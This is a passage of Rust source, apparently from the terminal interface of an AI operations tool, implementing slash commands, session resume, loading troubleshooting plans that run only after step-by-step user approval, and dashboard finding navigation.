                &std::env::current_dir().unwrap_or_else(|_| PathBuf::from(".")),
            ) {
                Ok(Some(path)) => self.push_chat(
                    MessageRole::System,
                    format!("Generated {}.", path.display()),
                ),
                Ok(None) => self.push_chat(
                    MessageRole::System,
                    "Current directory does not look like a project; no AGENTS.md generated.",
                ),
                Err(error) => self.push_chat(
                    MessageRole::Error,
                    format!("failed to generate AGENTS.md: {error}"),
                ),
            },
            CommandAction::Sessions => {
                let body = self.render_sessions_inline(20);
                self.push_chat(
                    MessageRole::System,
                    format!("Sessions (recent 20):\n{body}"),
                );
            }
            CommandAction::Resume => self.execute_resume_inline(""),
            CommandAction::Config => self.execute_config_inline(""),
            CommandAction::Theme => self.open_theme_selector(),
            CommandAction::Keybindings => self.execute_keybindings_inline(),
            CommandAction::Stats => self.execute_stats_inline(),
            CommandAction::Mcp => self.execute_mcp_list_inline(),
            CommandAction::Compact => self.execute_compact_inline(),
            CommandAction::Diff => self.execute_diff_inline(""),
            CommandAction::Tools => self.execute_tools_inline(),
            CommandAction::Undo => self.execute_undo_inline(false),
            CommandAction::Redo => self.execute_undo_inline(true),
            CommandAction::Cost => self.open_cost_meter(),
            CommandAction::Diagnose => {
                self.mode = AgentMode::Dashboard;
                self.push_chat(
                    MessageRole::System,
                    "Diagnose mode enabled — only read-only tools available. \
                     Run a task to begin."
                        .to_owned(),
                );
            }
            CommandAction::Evidence => {
                self.toast("Evidence reports are not available in dashboard mode.");
            }
            CommandAction::Quit => self.shutdown = true,
            CommandAction::Help => self.modal = Some(ModalState::Help),
            CommandAction::ApplyPlan => {
                // ApplyPlan requires args; fallback to hint
                self.push_chat(
                    MessageRole::System,
                    "Usage: /apply-plan <plan_id>\n  Apply a troubleshooting plan with step-by-step approval.",
                );
            }
            CommandAction::Dashboard => {
                self.mode = AgentMode::Dashboard;
                self.refresh_dashboard();
                self.toast("Dashboard mode");
            }
        }
    }

    fn execute_command_with_args(&mut self, command: CommandAction, args: &str) {
        self.modal = None;
        let args = args.trim();
        match command {
            CommandAction::Config if !args.is_empty() => self.execute_config_inline(args),
            CommandAction::Theme if !args.is_empty() => self.apply_theme_by_name(args),
            CommandAction::Diff if !args.is_empty() => self.execute_diff_inline(args),
            CommandAction::Sessions if !args.is_empty() => {
                let limit = args.parse::<u32>().unwrap_or(20);
                let body = self.render_sessions_inline(limit);
                self.push_chat(
                    MessageRole::System,
                    format!("Sessions (recent {limit}):\n{body}"),
                );
            }
            CommandAction::Resume => self.execute_resume_inline(args),
            CommandAction::Compact if !args.is_empty() => {
                self.push_chat(
                    MessageRole::System,
                    format!("[compact] hint noted: {args}. Transcript truncated to recent turns."),
                );
                self.execute_compact_inline();
            }
            CommandAction::ApplyPlan if !args.is_empty() => {
                self.execute_apply_plan_inline(args);
            }
            _ => self.execute_command(command),
        }
    }

    fn execute_config_inline(&mut self, raw: &str) {
        let path = self.runtime.config_path.clone();
        if raw.is_empty() {
            match std::fs::read_to_string(&path) {
                Ok(text) if text.trim().is_empty() => self.push_chat(
                    MessageRole::System,
                    format!("[config] {} is empty. Use `/config key.path=value` to set.", path.display()),
                ),
                Ok(text) => {
                    let trimmed: String = text.lines().take(60).collect::<Vec<_>>().join("\n");
                    self.push_chat(
                        MessageRole::System,
                        format!(
                            "[config] {} (first 60 lines)\n{trimmed}\nEdit via `/config key.path=value` or run `helm config edit`.",
                            path.display()
                        ),
                    );
                }
                Err(_) => self.push_chat(
                    MessageRole::System,
                    format!(
                        "[config] {} does not exist yet. Set a value with `/config key.path=value` (file will be created).",
                        path.display()
                    ),
                ),
            }
            return;
        }
        let Some(eq_idx) = raw.find('=') else {
            self.push_chat(
                MessageRole::Error,
                "[config] expected `key.path=value`. Example: `/config providers.default=anthropic`",
            );
            return;
        };
        let (key, value) = raw.split_at(eq_idx);
        let key = key.trim();
        let value = value[1..].trim();
        if key.is_empty() {
            self.push_chat(MessageRole::Error, "[config] empty key");
            return;
        }
        let existing = std::fs::read_to_string(&path).unwrap_or_default();
        let mut root: toml::Value = existing
            .parse()
            .unwrap_or_else(|_| toml::Value::Table(toml::map::Map::new()));
        let parts: Vec<&str> = key.split('.').collect();
        let parsed_val = if value == "true" {
            toml::Value::Boolean(true)
        } else if value == "false" {
            toml::Value::Boolean(false)
        } else if let Ok(i) = value.parse::<i64>() {
            toml::Value::Integer(i)
        } else if let Ok(f) = value.parse::<f64>() {
            toml::Value::Float(f)
        } else {
            toml::Value::String(value.to_owned())
        };
        if let Err(error) = crate::set_toml_path(&mut root, &parts, parsed_val) {
            self.push_chat(MessageRole::Error, format!("[config] {error}"));
            return;
        }
        let pretty = match toml::to_string_pretty(&root) {
            Ok(text) => text,
            Err(error) => {
                self.push_chat(MessageRole::Error, format!("[config] serialize: {error}"));
                return;
            }
        };
        if let Some(parent) = path.parent()
            && let Err(error) = std::fs::create_dir_all(parent)
        {
            self.push_chat(MessageRole::Error, format!("[config] create dir: {error}"));
            return;
        }
        if let Err(error) = std::fs::write(&path, pretty) {
            self.push_chat(MessageRole::Error, format!("[config] write: {error}"));
            return;
        }
        self.push_chat(
            MessageRole::System,
            format!("[config] {key} = {value} → {}", path.display()),
        );
    }

    fn open_theme_selector(&mut self) {
        let themes = Theme::all();
        let current = themes
            .iter()
            .position(|t| t.name() == self.theme.name())
            .unwrap_or(0);
        self.modal = Some(ModalState::ThemeSelector { selected: current });
    }

    fn apply_theme_by_name(&mut self, name: &str) {
        let needle = name.trim().to_ascii_lowercase();
        if let Some(theme) = Theme::all()
            .into_iter()
            .find(|t| t.name().eq_ignore_ascii_case(&needle))
        {
            let label = theme.name().to_owned();
            self.theme = theme;
            self.push_chat(
                MessageRole::System,
                format!("[theme] switched to {label}. Persist via `helm config set theme = \"{label}\"`."),
            );
        } else {
            let names: Vec<&str> = Theme::all().iter().map(|t| t.name()).collect();
            self.push_chat(
                MessageRole::Error,
                format!("[theme] unknown `{name}`. Choose: {}", names.join(", ")),
            );
        }
    }

    fn execute_keybindings_inline(&mut self) {
        let path = match crate::keybindings::config_path() {
            Ok(p) => p,
            Err(error) => {
                self.push_chat(MessageRole::Error, format!("[keybindings] {error}"));
                return;
            }
        };
        let exists = path.exists();
        let count = self.keymap.map.len();
        let actions = [
            "send",
            "newline",
            "quit",
            "palette",
            "tool_sidebar",
            "history",
            "clear",
            "cancel",
            "help",
            "external_editor",
            "verbose_toggle",
        ];
        let known = actions.join(", ");
        let body = if exists {
            format!(
                "[keybindings] {} ({} override(s) loaded)\nKnown actions: {}\nEdit via `$EDITOR {}` and reload HELM.",
                path.display(),
                count,
                known,
                path.display()
            )
        } else {
            format!(
                "[keybindings] no overrides at {}.\nKnown actions: {}\nCreate a JSON map (`{{\"send\": \"Enter\"}}`) at that path to remap.",
                path.display(),
                known
            )
        };
        self.push_chat(MessageRole::System, body);
    }

    fn execute_stats_inline(&mut self) {
        let memory = Arc::clone(&self.runtime.memory);
        let summary = tokio::task::block_in_place(|| {
            tokio::runtime::Handle::current().block_on(async move {
                let counts = match memory.episode_outcome_counts().await {
                    Ok(c) => c,
                    Err(error) => return format!("(stats unavailable: {error})"),
                };
                let recents = memory.recent_episodes(50).await.unwrap_or_default();
                let tokens_in: u64 = recents.iter().map(|e| e.tokens_in as u64).sum();
                let tokens_out: u64 = recents.iter().map(|e| e.tokens_out as u64).sum();
                format!(
                    "episodes: {} (ok {} / partial {} / fail {})\nlast {} runs · tokens in {} · tokens out {}",
                    counts.total,
                    counts.success,
                    counts.partial,
                    counts.failure,
                    recents.len(),
                    tokens_in,
                    tokens_out
                )
            })
        });
        self.push_chat(
            MessageRole::System,
            format!("[stats]\n{summary}\nRun `helm stats` for the daemon-side rollup."),
        );
    }

    fn execute_mcp_list_inline(&mut self) {
        let path_label = helm_tools::mcp::default_mcp_config_path()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|| "(no XDG config path)".to_owned());
        let body = match helm_tools::mcp::load_mcp_config() {
            Ok(cfg) if cfg.servers.is_empty() => {
                format!("no MCP servers configured at {path_label}. Run `helm mcp add`.")
            }
            Ok(cfg) => {
                let lines: Vec<String> = cfg
                    .servers
                    .iter()
                    .map(|s| format!("  {} → {}", s.name, s.command))
                    .collect();
                format!("MCP servers ({path_label}):\n{}", lines.join("\n"))
            }
            Err(error) => format!("(failed to load MCP config at {path_label}: {error})"),
        };
        self.push_chat(MessageRole::System, format!("[mcp] {body}"));
    }

    fn execute_compact_inline(&mut self) {
        let total = self.session.chat.len();
        const KEEP: usize = 12;
        if total <= KEEP {
            self.push_chat(
                MessageRole::System,
                format!("[compact] only {total} messages — nothing to compact."),
            );
            return;
        }
        let dropped = total - KEEP;
        self.session.chat.drain(..dropped);
        self.session.chat.insert(
            0,
            ChatMessage {
                role: MessageRole::System,
                text: format!("[compact] {dropped} earlier turns folded; last {KEEP} kept."),
            },
        );
        self.session.transcript_scroll = 0;
    }

    fn session_store(&self) -> Result<helm_memory::SessionStore, String> {
        let sessions_dir = self
            .runtime
            .db_path
            .parent()
            .map(|p| p.to_path_buf())
            .unwrap_or_else(|| PathBuf::from("."));
        tokio::task::block_in_place(|| {
            tokio::runtime::Handle::current()
                .block_on(helm_memory::SessionStore::open(
                    &self.runtime.db_path,
                    sessions_dir.join("snapshots"),
                ))
                .map_err(|error| error.to_string())
        })
    }

    fn render_sessions_inline(&self, limit: u32) -> String {
        match self.session_store() {
            Ok(store) => tokio::task::block_in_place(|| {
                tokio::runtime::Handle::current().block_on(async move {
                    match store.list_sessions(limit).await {
                        Ok(list) if list.is_empty() => "(no sessions yet)".to_owned(),
                        Ok(list) => list
                            .into_iter()
                            .map(|s| {
                                format!(
                                    "[{}] {} — {}",
                                    s.id,
                                    s.name,
                                    s.goal.chars().take(60).collect::<String>()
                                )
                            })
                            .collect::<Vec<_>>()
                            .join("\n"),
                        Err(error) => format!("error listing sessions: {error}"),
                    }
                })
            }),
            Err(error) => format!("error opening session store: {error}"),
        }
    }

    fn execute_resume_inline(&mut self, raw: &str) {
        let target = raw.trim();
        let store = match self.session_store() {
            Ok(store) => store,
            Err(error) => {
                self.push_chat(MessageRole::Error, format!("resume failed: {error}"));
                return;
            }
        };
        let target = target.to_owned();
        let memory = Arc::clone(&self.runtime.memory);
        let loaded = tokio::task::block_in_place(|| {
            tokio::runtime::Handle::current().block_on(async move {
                let session = if target.is_empty() || target == "latest" {
                    store.latest_session().await
                } else {
                    store.get_session(&target).await
                }?;
                let Some(session) = session else {
                    return Ok::<
                        Option<(
                            helm_memory::SessionRecord,
                            Option<helm_memory::EpisodeRecord>,
                            Vec<helm_memory::StepRecord>,
                        )>,
                        helm_core::MemoryError,
                    >(None);
                };
                let episode = memory.episode_by_id(&session.episode_id).await?;
                let steps = memory.get_steps(&session.episode_id).await?;
                Ok(Some((session, episode, steps)))
            })
        });
        match loaded {
            Ok(Some((session, episode, steps))) => {
                let recap = crate::build_session_recap(&session, episode.as_ref(), &steps);
                self.resume_context = Some(recap.clone());
                self.session.episode_id = Some(session.episode_id.clone());
                self.push_chat(
                    MessageRole::System,
                    format!(
                        "{recap}\nFuture prompts will include this session context until `/new`."
                    ),
                );
            }
            Ok(None) => self.push_chat(MessageRole::System, "No sessions available to resume."),
            Err(error) => self.push_chat(MessageRole::Error, format!("resume failed: {error}")),
        }
    }

    fn execute_diff_inline(&mut self, path_arg: &str) {
        let target = path_arg.trim();
        if target.is_empty() {
            self.push_chat(
                MessageRole::System,
                "[diff] usage: `/diff <path>` — prints first 80 lines of the file. \
                 Snapshots are taken on every fs_write; restore with `helm undo`.",
            );
            return;
        }
        let target_path = std::path::PathBuf::from(target);
        match std::fs::read_to_string(&target_path) {
            Ok(text) => {
                let preview: String = text.lines().take(80).collect::<Vec<_>>().join("\n");
                self.push_chat(
                    MessageRole::System,
                    format!(
                        "[diff:{}] (first 80 lines)\n{preview}",
                        target_path.display()
                    ),
                );
            }
            Err(error) => self.push_chat(
                MessageRole::Error,
                format!("[diff] cannot read {}: {error}", target_path.display()),
            ),
        }
    }

    fn execute_tools_inline(&mut self) {
        let registry = helm_tools::ToolRegistry::default();
        let schemas = registry.schemas();
        let count = schemas.len();
        let mut names: Vec<String> = schemas.iter().map(|s| s.name.clone()).collect();
        names.sort();
        let body = names
            .chunks(4)
            .map(|chunk| {
                chunk
                    .iter()
                    .map(|n| format!("{:<14}", n))
                    .collect::<Vec<_>>()
                    .join(" ")
            })
            .collect::<Vec<_>>()
            .join("\n");
        self.push_chat(
            MessageRole::System,
            format!("[tools] {count} loaded:\n{body}"),
        );
    }

    fn execute_undo_inline(&mut self, redo: bool) {
        let verb = if redo { "redo" } else { "undo" };
        self.push_chat(
            MessageRole::System,
            format!(
                "[{verb}] run from CLI: `helm undo --apply` (or `--apply --to <path>`). \
                 Each fs_write is auto-snapshot'd in the session store."
            ),
        );
    }

    fn execute_apply_plan_inline(&mut self, plan_id: &str) {
        // Load plan from database and show preview in transcript
        let db_path = self.runtime.db_path.clone();
        let conn = match rusqlite::Connection::open(&db_path) {
            Ok(c) => c,
            Err(e) => {
                self.push_chat(
                    MessageRole::Error,
                    format!("[apply-plan] DB open failed: {e}"),
                );
                return;
            }
        };
        let record = match TroubleshootingPlanStore::get(&conn, plan_id) {
            Ok(Some(r)) => r,
            Ok(None) => {
                self.push_chat(
                    MessageRole::Error,
                    format!(
                        "[apply-plan] plan '{plan_id}' not found. Run `helm troubleshoot` first."
                    ),
                );
                return;
            }
            Err(e) => {
                self.push_chat(
                    MessageRole::Error,
                    format!("[apply-plan] DB query error: {e}"),
                );
                return;
            }
        };

        // Parse and display steps
        let steps: Vec<serde_json::Value> =
            serde_json::from_str(&record.proposed_fix_steps_json).unwrap_or_default();
        let step_count = steps.len();
        if step_count == 0 {
            self.push_chat(
                MessageRole::System,
                "[apply-plan] Plan has no fix steps to execute.",
            );
            return;
        }

        let title = if record.source.starts_with("user:") {
            record.source.trim_start_matches("user:").trim().to_string()
        } else {
            record.source.clone()
        };

        let mut body = String::new();
        body.push_str(&format!("Plan: {title} ({plan_id})\n"));
        body.push_str(&format!(
            "Snapshot: {} | {} fix steps\n\n",
            record.snapshot_id, step_count
        ));
        for (i, s) in steps.iter().enumerate() {
            let cmd = s["command"]["command_text"]
                .as_str()
                .unwrap_or("(no command)");
            let effect = s["command"]["expected_effect"].as_str().unwrap_or("");
            let risk = s["command"]["risk"].as_str().unwrap_or("none");
            let tool = s["command"]["tool"].as_str().unwrap_or("shell");
            body.push_str(&format!("  {}. [{risk}] {tool}: {cmd}\n", i + 1));
            body.push_str(&format!("     Effect: {effect}\n"));
        }
        body.push_str("\nUse `y` to approve, `n` to skip, `!` to approve all, `Esc` to cancel.");

        self.push_chat(
            MessageRole::System,
            format!("[apply-plan] Loaded plan:\n{body}"),
        );

        // Enter approval modal with step-by-step flow
        let previews: Vec<String> = steps
            .iter()
            .map(|s| {
                s["command"]["command_text"]
                    .as_str()
                    .unwrap_or("")
                    .to_string()
            })
            .collect();
        let effects: Vec<String> = steps
            .iter()
            .map(|s| {
                s["command"]["expected_effect"]
                    .as_str()
                    .unwrap_or("")
                    .to_string()
            })
            .collect();
        let tools: Vec<String> = steps
            .iter()
            .map(|s| s["command"]["tool"].as_str().unwrap_or("shell").to_string())
            .collect();
        let risks: Vec<String> = steps
            .iter()
            .map(|s| s["command"]["risk"].as_str().unwrap_or("none").to_string())
            .collect();

        self.modal = Some(ModalState::PlanExecution {
            plan_id: plan_id.to_string(),
            plan_title: title,
            step_index: 0,
            step_count,
            step_previews: previews,
            step_effects: effects,
            step_tools: tools,
            step_risks: risks,
            phase: PlanExecPhase::Approving,
            result_summary: String::new(),
        });
    }

    fn start_apply_plan_execution(&mut self, plan_id: String) {
        let db_path = self.runtime.db_path.clone();
        let (tx, rx) = tokio::sync::oneshot::channel::<Result<String, String>>();
        self.pending_apply_rx = Some(rx);
        let handle = tokio::runtime::Handle::current();
        std::thread::spawn(move || {
            handle.block_on(async move {
                let args = crate::ApplyPlanArgs {
                    plan_id,
                    yes: true,
                    json: false,
                };
                let result = crate::run_apply_plan_command_at_path(db_path, args)
                    .await
                    .map_err(|error| error.to_string());
                let _ = tx.send(result);
            });
        });
    }

    fn persist_pinned_incident_from_current(&mut self) {
        if let Some(finding) = self.current_dashboard_finding() {
            let active_plan_id = self
                .dashboard
                .active_plan
                .as_ref()
                .filter(|plan| plan.finding_id == finding.id)
                .map(|plan| plan.plan_id.clone());
            self.dashboard.pinned_incident = Some(PinnedIncidentState {
                fingerprint: finding.fingerprint.clone(),
                active_plan_id,
            });
        }
    }

    fn workspace_fingerprint(&self) -> Option<&str> {
        match self.dashboard.view {
            DashboardView::FindingDetail(_)
            | DashboardView::EvidenceView(_)
            | DashboardView::TroubleshootPlan(_) => self
                .dashboard
                .pinned_incident
                .as_ref()
                .map(|pinned| pinned.fingerprint.as_str())
                .or(self.dashboard.selected_fingerprint.as_deref()),
            DashboardView::Overview => self.dashboard.selected_fingerprint.as_deref(),
        }
    }

    fn dashboard_plan_steps_json(steps: &[ValidatedFixStep]) -> String {
        let payload = steps
            .iter()
            .enumerate()
            .map(|(index, step)| {
                serde_json::json!({
                    "title": format!("step-{}", index + 1),
                    "command": {
                        "tool": "shell",
                        "input": { "command": step.command },
                        "command_text": step.command,
                        "expected_effect": step.purpose,
                        "risk": step.risk,
                        "blast_radius": "Unknown",
                        "rollback": step.rollback,
                        "verification": []
                    },
                    "hypothesis_id": serde_json::Value::Null,
                    "expected_output": serde_json::Value::Null,
                    "interpretation_guide": serde_json::Value::Null
                })
            })
            .collect::<Vec<_>>();
        serde_json::to_string(&payload).unwrap_or_else(|_| "[]".to_owned())
    }

    fn dashboard_read_only_steps_json(checks: &[String]) -> String {
        serde_json::to_string(checks).unwrap_or_else(|_| "[]".to_owned())
    }

    fn dashboard_verification_steps(finding: &FindingSummary) -> Vec<String> {
        if !finding.read_only_checks.is_empty() {
            finding.read_only_checks.clone()
        } else {
            vec![
                format!(
                    "Confirm `{}` is no longer active in the incident queue.",
                    finding.title
                ),
                format!(
                    "Re-run a targeted health check for `{}`.",
                    finding.affected_resource
                ),
            ]
        }
    }

    fn dashboard_plan_from_record(
        &self,
        record: &TroubleshootingPlanRecord,
    ) -> Option<DashboardPlan> {
        let fix_steps = Self::validated_steps_from_plan_json(&record.proposed_fix_steps_json);
        let status = match record.dashboard_plan_status.as_str() {
            "loading" | "pending" => PlanStatus::Loading {
                started_at: record.updated_at.max(record.created_at),
            },
            "ready" if !fix_steps.is_empty() => PlanStatus::Ready {
                narrative: if record.narrative_summary.trim().is_empty() {
                    record.verdict_summary.clone()
                } else {
                    record.narrative_summary.clone()
                },
                fix_steps: fix_steps.clone(),
            },
            "timeout" => PlanStatus::Timeout,
            "rate_limited" => PlanStatus::RateLimited {
                retry_after_secs: record
                    .generation_error
                    .strip_prefix("retry_after_secs=")
                    .and_then(|value| value.parse::<u64>().ok())
                    .unwrap_or(30),
            },
            "auth_failed" => PlanStatus::AuthFailed,
            "dangerous_command" => PlanStatus::DangerousCommand {
                pattern: record.generation_error.clone(),
                command_text: String::new(),
            },
            "malformed_response" => PlanStatus::MalformedResponse,
            _ if !fix_steps.is_empty() => PlanStatus::Ready {
                narrative: if record.narrative_summary.trim().is_empty() {
                    record.verdict_summary.clone()
                } else {
                    record.narrative_summary.clone()
                },
                fix_steps: fix_steps.clone(),
            },
            _ => return None,
        };

        Some(DashboardPlan {
            finding_id: if !record.finding_id.is_empty() {
                record.finding_id.clone()
            } else {
                finding_id_from_source(&record.source)
                    .unwrap_or_default()
                    .to_owned()
            },
            plan_id: record.id.clone(),
            status,
            read_only_steps: serde_json::from_str::<Vec<String>>(&record.read_only_steps_json)
                .map(|steps| steps.len())
                .unwrap_or(0),
            fix_steps: fix_steps.len(),
            rate_limit_retry_at: None,
            rate_limit_retry_pending: false,
        })
    }

    fn validated_steps_from_plan_json(proposed_fix_steps_json: &str) -> Vec<ValidatedFixStep> {
        let raw_steps: Vec<serde_json::Value> =
            serde_json::from_str(proposed_fix_steps_json).unwrap_or_default();
        raw_steps
            .into_iter()
            .filter_map(|step| {
                let command = step
                    .get("command")
                    .and_then(|command| command.get("command_text"))
                    .and_then(serde_json::Value::as_str)
                    .or_else(|| step.get("command").and_then(serde_json::Value::as_str))
                    .unwrap_or_default()
                    .trim()
                    .to_owned();
                if command.is_empty() {
                    return None;
                }
                let purpose = step
                    .get("command")
                    .and_then(|command| command.get("expected_effect"))
                    .and_then(serde_json::Value::as_str)
                    .or_else(|| step.get("purpose").and_then(serde_json::Value::as_str))
                    .unwrap_or_default()
                    .to_owned();
                let risk = step
                    .get("command")
                    .and_then(|command| command.get("risk"))
                    .and_then(serde_json::Value::as_str)
                    .or_else(|| step.get("risk").and_then(serde_json::Value::as_str))
                    .unwrap_or("none")
                    .to_owned();
                let rollback = step
                    .get("command")
                    .and_then(|command| command.get("rollback"))
                    .and_then(serde_json::Value::as_str)
                    .or_else(|| step.get("rollback").and_then(serde_json::Value::as_str))
                    .unwrap_or("none")
                    .to_owned();
                Some(ValidatedFixStep {
                    command,
                    purpose,
                    risk,
                    rollback,
                    binary_warnings: Vec::new(),
                })
            })
            .collect()
    }

    fn persist_dashboard_plan_status(
        &mut self,
        conn: &rusqlite::Connection,
        finding: &FindingSummary,
        plan_id: &str,
        status: &PlanStatus,
    ) {
        let (dashboard_plan_status, generation_error, proposed_fix_steps_json, narrative_summary) =
            match status {
                PlanStatus::Loading { .. } => {
                    ("loading", String::new(), "[]".to_owned(), String::new())
                }
                PlanStatus::Ready {
                    narrative,
                    fix_steps,
                } => (
                    "ready",
                    String::new(),
                    Self::dashboard_plan_steps_json(fix_steps),
                    narrative.clone(),
                ),
                PlanStatus::Timeout => ("timeout", String::new(), "[]".to_owned(), String::new()),
                PlanStatus::RateLimited { retry_after_secs } => (
                    "rate_limited",
                    format!("retry_after_secs={retry_after_secs}"),
                    "[]".to_owned(),
                    String::new(),
                ),
                PlanStatus::AuthFailed => {
                    ("auth_failed", String::new(), "[]".to_owned(), String::new())
                }
                PlanStatus::MalformedResponse => (
                    "malformed_response",
                    String::new(),
                    "[]".to_owned(),
                    String::new(),
                ),
                PlanStatus::DangerousCommand { pattern, .. } => (
                    "dangerous_command",
                    pattern.clone(),
                    "[]".to_owned(),
                    String::new(),
                ),
            };

        let verification_steps_json =
            serde_json::to_string(&Self::dashboard_verification_steps(finding))
                .unwrap_or_else(|_| "[]".to_owned());
        let reproduction_steps_json =
            Self::dashboard_read_only_steps_json(&finding.read_only_checks);
        let read_only_steps_json = Self::dashboard_read_only_steps_json(&finding.read_only_checks);

        if let Err(error) = TroubleshootingPlanStore::update_dashboard_plan(
            conn,
            plan_id,
            &finding.id,
            &read_only_steps_json,
            &proposed_fix_steps_json,
            &narrative_summary,
            dashboard_plan_status,
            &generation_error,
            &verification_steps_json,
            &reproduction_steps_json,
        ) {
            tracing::warn!(plan_id = %plan_id, error = %error, "failed to persist dashboard plan");
        }
    }

    fn restore_active_dashboard_plan(
        &mut self,
        conn: &rusqlite::Connection,
        finding_id: &str,
        preferred_plan_id: Option<&str>,
    ) {
        let record = preferred_plan_id
            .and_then(|plan_id| TroubleshootingPlanStore::get(conn, plan_id).ok().flatten())
            .filter(|record| {
                record.finding_id == finding_id
                    || finding_id_from_source(&record.source) == Some(finding_id)
            })
            .or_else(|| {
                TroubleshootingPlanStore::latest_for_finding(conn, finding_id)
                    .ok()
                    .flatten()
            });

        self.dashboard.active_plan = record
            .as_ref()
            .and_then(|record| self.dashboard_plan_from_record(record));

        if let Some(pinned) = self.dashboard.pinned_incident.as_mut() {
            pinned.active_plan_id = self
                .dashboard
                .active_plan
                .as_ref()
                .map(|plan| plan.plan_id.clone());
        }
    }

    /// Resolve selected_fingerprint to an absolute index in data.findings (via visible list).
    fn dashboard_selected_finding_index(&self) -> Option<usize> {
        if let Some(fp) = self.workspace_fingerprint() {
            if let Some(idx) = self
                .dashboard
                .data
                .findings
                .iter()
                .position(|finding| finding.fingerprint == fp)
            {
                return Some(idx);
            }
        }
        if let DashboardView::FindingDetail(idx)
        | DashboardView::EvidenceView(idx)
        | DashboardView::TroubleshootPlan(idx) = self.dashboard.view
        {
            return self.dashboard.data.findings.get(idx).map(|_| idx);
        }
        let visible = self.dashboard_visible_finding_indices();
        let vpos = self.selected_visible_index()?;
        visible.get(vpos).copied()
    }

    /// Resolve selected_fingerprint to a position in the filtered visible list.
    fn selected_visible_index(&self) -> Option<usize> {
        let fp = self.dashboard.selected_fingerprint.as_ref()?;
        let visible = self.dashboard_visible_finding_indices();
        visible.iter().position(|&idx| {
            self.dashboard
                .data
                .findings
                .get(idx)
                .map(|f| &f.fingerprint == fp)
                .unwrap_or(false)
        })
    }

    /// Set selected_fingerprint from a visible-index position.
    fn set_selected_from_visible_index(&mut self, vpos: usize) {
        let visible = self.dashboard_visible_finding_indices();
        let fp = visible
            .get(vpos)
            .and_then(|&idx| self.dashboard.data.findings.get(idx))
            .map(|f| f.fingerprint.clone());
        self.dashboard.selected_fingerprint = fp;
        if !matches!(self.dashboard.view, DashboardView::Overview) {
            self.persist_pinned_incident_from_current();
        }
    }

    fn dashboard_visible_finding_indices(&self) -> Vec<usize> {
        self.dashboard
            .data
            .findings
            .iter()
            .enumerate()
            .filter_map(|(idx, finding)| {
                self.finding_matches_dashboard_filters(finding)
                    .then_some(idx)
            })
            .collect()
    }

    fn finding_matches_dashboard_filters(&self, finding: &FindingSummary) -> bool {
        match self.dashboard.finding_state_filter {
            DashboardFindingStateFilter::Active => matches!(
                finding.status,
                DashboardFindingState::Open
                    | DashboardFindingState::New
                    | DashboardFindingState::Recurring
            ),
            DashboardFindingStateFilter::All => true,
            DashboardFindingStateFilter::NewOnly => finding.status == DashboardFindingState::New,
            DashboardFindingStateFilter::OpenOnly => finding.status == DashboardFindingState::Open,
            DashboardFindingStateFilter::RecurringOnly => {
                finding.status == DashboardFindingState::Recurring
            }
            DashboardFindingStateFilter::SuppressedOnly => {
                finding.status == DashboardFindingState::Suppressed
            }
            DashboardFindingStateFilter::ResolvedOnly => {
                finding.status == DashboardFindingState::Resolved
            }
        }
    }

    fn clamp_dashboard_selection(&mut self) {
        let visible = self.dashboard_visible_finding_indices();
        if visible.is_empty() {
            self.dashboard.selected_fingerprint = None;
            self.dashboard.pinned_incident = None;
            self.dashboard.active_plan = None;
            self.dashboard.table_scroll = 0;
            self.dashboard.detail_scroll = 0;
            return;
        }
        // If current fingerprint not in visible list, select first visible.
        if self.selected_visible_index().is_none() {
            self.dashboard.selected_fingerprint = visible
                .first()
                .and_then(|&idx| self.dashboard.data.findings.get(idx))
                .map(|f| f.fingerprint.clone());
        }
        // Keep scroll in bounds.
        if let Some(vpos) = self.selected_visible_index() {
            if vpos < self.dashboard.table_scroll {
                self.dashboard.table_scroll = vpos;
            }
        }
        if !matches!(self.dashboard.view, DashboardView::Overview) {
            self.persist_pinned_incident_from_current();
        }
    }

    fn move_dashboard_selection(&mut self, delta: isize) {
        let visible = self.dashboard_visible_finding_indices();
        if visible.is_empty() {
            self.dashboard.selected_fingerprint = None;
            self.dashboard.table_scroll = 0;
            return;
        }
        let current_vpos = self.selected_visible_index().unwrap_or(0);
        let next_vpos = ((current_vpos as isize) + delta)
            .clamp(0, visible.len().saturating_sub(1) as isize) as usize;
        self.set_selected_from_visible_index(next_vpos);
        if let Some(vpos) = self.selected_visible_index() {
            if vpos < self.dashboard.table_scroll {
                self.dashboard.table_scroll = vpos;
            }
        }
    }

    fn current_dashboard_finding(&self) -> Option<&FindingSummary> {
        let idx = self.dashboard_selected_finding_index()?;
        self.dashboard.data.findings.get(idx)
    }

    fn cycle_dashboard_filter(&mut self, delta: isize) {
        let filters = DashboardFindingStateFilter::all();
        let current = filters
            .iter()
            .position(|f| *f == self.dashboard.finding_state_filter)
            .unwrap_or(0);
        let next = if delta < 0 {
            current.saturating_sub(1)
        } else {
            (current + 1).min(filters.len().saturating_sub(1))
        };
        self.dashboard.finding_state_filter = filters[next];
        self.dashboard.selected_fingerprint = None;
        self.dashboard.table_scroll = 0;
        self.dashboard.detail_scroll = 0;
    }

    async fn handle_dashboard_enter(&mut self, tx: mpsc::UnboundedSender<UiEvent>) -> Result<()> {
        match self.dashboard.view {
            DashboardView::Overview => match self.dashboard.pane {
                DashboardFocus::Tabbar => {
                    self.dashboard.pane = DashboardFocus::Table;
                }
                DashboardFocus::Table | DashboardFocus::Detail => {
                    // Fleet tab has special Enter behavior: switch active_remote
                    if self.dashboard.active_tab == OpsTab::Fleet {
                        if let Some(row) = self.dashboard.fleet_selected_row {
                            if let Some(host) = self.dashboard.data.fleet_hosts.get(row) {
                                self.toast(format!("Switched to host: {}", host.name));
                                // Trigger dashboard refresh after remote switch
                                self.refresh_dashboard_live().await?;
                            }
                        }
                    } else if let Some(idx) = self.dashboard_selected_finding_index() {
                        self.dashboard.view = DashboardView::FindingDetail(idx);
                        self.dashboard.detail_scroll = 0;
                        self.persist_pinned_incident_from_current();
                    } else {
                        self.toast("No finding selected");
                    }
                }
            },
            DashboardView::FindingDetail(idx) => {
                self.dashboard.view = DashboardView::EvidenceView(idx);
                self.dashboard.detail_scroll = 0;
                self.persist_pinned_incident_from_current();
            }
            DashboardView::EvidenceView(_) => {
                self.generate_dashboard_plan().await?;
            }
            DashboardView::TroubleshootPlan(_) => {
                self.apply_dashboard_plan().await?;
            }
        }
        if matches!(self.dashboard.view, DashboardView::FindingDetail(_))
            || matches!(self.dashboard.view, DashboardView::EvidenceView(_))
            || matches!(self.dashboard.view, DashboardView::TroubleshootPlan(_))
        {
            self.session.transcript_scroll = 0;
        }
        let _ = tx;
        Ok(())
    }

    async fn refresh_dashboard_live(&mut self) -> Result<()> {
        // Set overlap guard to prevent the 60s tick from firing again while we're running
